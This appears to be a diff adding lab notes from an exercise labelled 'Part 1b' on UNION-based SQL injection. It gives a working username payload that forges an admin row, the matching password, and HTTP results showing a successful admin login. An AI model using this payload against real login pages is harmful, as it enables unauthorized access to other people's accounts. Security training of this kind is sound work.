@@ -1,0 +1,5 @@
+# Part 1b - UNION SQL injection: log in as admin WITHOUT admin's real password
+# username payload: zzz' UNION SELECT 1,'admin','admin','pwned' -- 
+# password:        pwned
+login POST HTTP 302 (302 = success)
+admin GET HTTP 200 (200 = admin dashboard open)
